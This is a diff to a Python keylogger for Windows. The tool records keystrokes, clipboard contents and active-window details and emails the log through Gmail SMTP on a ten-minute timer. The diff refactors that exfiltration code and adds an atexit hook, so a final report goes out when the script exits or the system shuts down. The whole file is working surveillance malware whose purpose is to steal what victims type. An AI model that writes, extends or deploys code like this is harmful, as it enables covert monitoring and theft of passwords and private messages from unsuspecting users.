@@ -3,6 +3,7 @@ import sys
 import time
 import smtplib
 import threading
+import atexit  # Handles clean exit during system shutdown or script termination
 from ctypes import windll, byref, create_unicode_buffer, c_ulong
 import tkinter as tk
 from tkinter import simpledialog, messagebox
@@ -13,7 +14,7 @@ class EmailSender:
     def __init__(self, email, app_password):
         self.email = email
         self.app_password = app_password
-        self.smtp_server = "smtp.gmail.com"
+        self.smtp_server = "smtp.gmail.com" #You can also use smtp.outlook.com
         self.smtp_port = 587
     
     def send(self, subject, body):
@@ -40,28 +41,40 @@ class KeyLogger:
         self.use_email = use_email 
         self.email = email
         self.sender = EmailSender(email, password) if use_email else None
-        self.interval = 600
+        self.interval = 600 # 10 minutes
+
+        if self.use_email:
+            atexit.register(self.final_report)
+
+    def send_log_logic(self, is_final=False):
+        """Core logic for reading and transmitting logs."""
+        if not self.use_email or not os.path.exists(self.log_path):
+            return
+
+        try:
+            with open(self.log_path, "r", encoding="utf-8") as f:
+                log_content = f.read()
+            
+            if log_content.strip() and "--- Log reset" not in log_content.strip()[:20]:
+                subject = f"Keylogger Report {'[FINAL]' if is_final else ''} - {time.ctime()}"
+                success = self.sender.send(subject, log_content)
+                
+                if success:
+                    with open(self.log_path, "w", encoding="utf-8") as f:
+                        f.write(f"--- Log reset after email at {time.ctime()} ---\n")
+        except Exception:
+            pass
 
     def report(self):
         """Timer-based reporting loop."""
-        if not self.use_email:
-            return
-
-        if os.path.exists(self.log_path):
-            try:
-                with open(self.log_path, "r", encoding="utf-8") as f:
-                    log_content = f.read()
-                if log_content.strip():
-                    success = self.sender.send(f"Keylogger Report - {time.ctime()}", log_content)
-                    if success:
-                        with open(self.log_path, "w", encoding="utf-8") as f:
-                            f.write(f"--- Log reset after email at {time.ctime()} ---\n")
-            except Exception:
-                pass
-        
+        self.send_log_logic()
         timer = threading.Timer(self.interval, self.report)
         timer.daemon = True
         timer.start()
+
+    def final_report(self):
+        """Emergency transmission: triggered on system shutdown or script exit[cite: 1]."""
+        self.send_log_logic(is_final=True)
 
     def get_current_process(self):
         """Captures window info using Unicode Windows API."""
@@ -84,7 +97,7 @@ class KeyLogger:
                 self.kernel32.CloseHandle(h_process)
 
     def on_press(self, key):
-        """Event handler for keystrokes and clipboard."""
+        """Event handler for keystrokes and clipboard monitoring."""
         self.get_current_process()
         content = ""
         try:
